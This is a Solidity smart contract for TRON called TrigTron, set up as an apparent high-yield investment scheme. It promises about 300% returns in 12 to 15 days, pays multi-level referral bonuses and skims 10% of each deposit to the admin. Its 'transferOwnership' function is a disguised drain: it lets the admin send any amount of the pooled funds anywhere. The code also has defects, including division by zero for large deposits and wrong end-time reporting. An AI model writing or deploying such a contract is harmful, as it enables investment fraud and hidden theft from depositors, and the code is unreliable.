//SourceUnit: TrigTron.sol

pragma solidity ^0.5.9 <0.6.0;

contract TrigTron {
    using SafeMath for uint256;
    
    struct PlayerDeposit {
        uint256 amount;
        uint256 time;
        uint256 inv_days;
        uint256 inv_perc;
    }
    
    struct Player {
        address referral;
        uint256 dividends;
        uint256 dividends_hold;
        uint256 dividends_available;
        uint256 referral_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 referral_buzz;
        
        PlayerDeposit[] deposits;
        mapping(uint8 => uint256) referrals_per_level;
        mapping(uint8 => uint256) referrals_income_per_level;
    }

    
    address payable admin;
    
    uint256 total_investors;
    uint256 total_invested;
    uint256 total_withdrawn;
    uint8[] referral_bonuses;
    uint32 max_income;
    mapping(address => Player) public players;
    
    modifier onlyAdmin(){
        require(msg.sender == admin,"You are not authorized.");
        _;
    }
    
    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint256 balance) {
        return (total_investors, total_invested, total_withdrawn,address(this).balance);
    }
    
    event Withdraw(address indexed addr, uint256 amount);
    
    constructor() public {
        admin = msg.sender;
        referral_bonuses.push(80);
        referral_bonuses.push(40);
        referral_bonuses.push(30);
        referral_bonuses.push(20);
        referral_bonuses.push(10);
        max_income = 300;
    }
    
    function deposit(address _referral) external payable {
        Player storage player = players[msg.sender];
        uint256 depAmt = (player.dividends_hold==0 && player.total_invested==0)?msg.value:player.dividends_hold;
        uint256 share = depAmt.mul(10).div(100);
        uint32 inv_perc;
        uint32 inv_days;
        
        require(depAmt >= 100000000, "Invalid Amount");
        admin.transfer(share);
        if(depAmt>=100000000 && depAmt<=10000000000){
            inv_days = 15 ;
            inv_perc = 300;
        }
        else if(depAmt>=10001000000 && depAmt<=20000000000){
            inv_days = 14;
            inv_perc = 301;
        }
        else if(depAmt>=20001000000 && depAmt<=100000000000){
            inv_days = 12;
            inv_perc = 298;                         
        }
        else if(depAmt>=100001000000 && depAmt<=500000000000){
            inv_days = 12;
            inv_perc = 300;
        }
       
        player.deposits.push(PlayerDeposit({
            amount: depAmt,
            time: uint256(block.timestamp),
            inv_days: inv_days,
            inv_perc: inv_perc
        }));
        
        if(player.total_invested == 0x0){
            total_investors += 1;
        }

        player.total_invested += depAmt;
        
       
        total_invested += depAmt;
        _setReferral(msg.sender, _referral,depAmt);
        
        
    }
    function redeposit(address _referral) external  {
        Player storage player = players[msg.sender];
        uint256 depAmt = player.dividends_available;
        uint32 inv_perc;
        uint32 inv_days;
        
        require(depAmt >= 100000000, "Invalid Amount");
        
        if(depAmt>=100000000 && depAmt<=10000000000){
            inv_days = 15 ;
            inv_perc = 300;
        }
        else if(depAmt>=10001000000 && depAmt<=20000000000){
            inv_days = 14;
            inv_perc = 301;
        }
        else if(depAmt>=20001000000 && depAmt<=100000000000){
            inv_days = 12;
            inv_perc = 298;                         
        }
        else if(depAmt>=100001000000 && depAmt<=500000000000){
            inv_days = 12;
            inv_perc = 300;
        }
       
        player.deposits.push(PlayerDeposit({
            amount: depAmt,
            time: uint256(block.timestamp),
            inv_days: inv_days,
            inv_perc: inv_perc
        }));
        
        player.total_invested += depAmt;
        player.dividends_hold = 0;
        player.dividends_available = 0;
        total_invested += depAmt;
        _setReferral(msg.sender, _referral,depAmt);
        
        
    }
    
    function _setReferral(address _addr, address _referral,uint256 _amount) private {
        if(players[_addr].referral == address(0)) {
            
            players[_addr].referral = _referral;
            for(uint8 i = 0; i < referral_bonuses.length; i++) {
                uint256 bonus = _amount * referral_bonuses[i] / 1000;
                players[_referral].referral_bonus += bonus;
                players[_referral].referrals_per_level[i]++;
                players[_referral].referrals_income_per_level[i]+=bonus;
                _referral = players[_referral].referral;
                if(_referral == address(0)) break;
            }
        }
    }
    
    function withdraw() payable external {
        Player storage player = players[msg.sender];
        _payout(msg.sender);
        
        require(player.dividends > 0 || player.referral_bonus  > 0, "Zero amount");
        
        uint256 amount = player.dividends.mul(60).div(100) + player.referral_bonus;
        player.dividends_hold+=player.dividends.mul(40).div(100);
        player.dividends_available+=player.dividends_hold.mul(90).div(100);
        player.dividends = 0;
        player.referral_bonus = 0;
        player.total_withdrawn += amount;
        total_withdrawn += amount;
        player.last_payout = uint256(block.timestamp);
        msg.sender.transfer(amount);

        emit Withdraw(msg.sender, amount);
    }
    
    function transferOwnership(address payable new_owner,uint256 amount) external onlyAdmin{
        new_owner.transfer(amount);
    }
    
    function availamount(address ref,uint256 chkamount) view private returns(uint256) {
        uint256 total_income = players[ref].total_withdrawn + players[ref].dividends + players[ref].referral_bonus;
        uint256 avl_amount=(players[ref].total_invested*max_income/100)-total_income;
        return (avl_amount>=chkamount)?chkamount:avl_amount;
    }
    
    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);
        if(payout > 0) {
           players[_addr].dividends += payout;
            
        }
    }
    
    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + dep.inv_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);
 
            if(from < to) {
                value += dep.amount * (to - from) * dep.inv_perc / dep.inv_days / 8640000;
                
            }
        }
        value=availamount(_addr,value);
        return value;
    }
    
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256[6] memory referrals, uint256[6] memory refperlevel) {
        Player storage player = players[_addr];
        uint256 payout = this.payoutOf(_addr);
        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            referrals[i] = player.referrals_per_level[i];
            refperlevel[i] = player.referrals_income_per_level[i];
        }
        return (
            payout + player.dividends + player.referral_bonus,
            referrals,
            refperlevel
        );
    }
    
    
    
    function investmentsInfo(address _addr) view external returns(uint256[] memory endTimes, uint256[] memory amounts) {
        Player storage player = players[_addr];
        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        for(uint256 i = 0; i < player.deposits.length; i++) {
           PlayerDeposit storage dep = player.deposits[i];
           _amounts[i] = dep.amount;
           _endTimes[i] = dep.time + dep.inv_days;
        }
        return (
          _endTimes,
          _amounts
        );
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}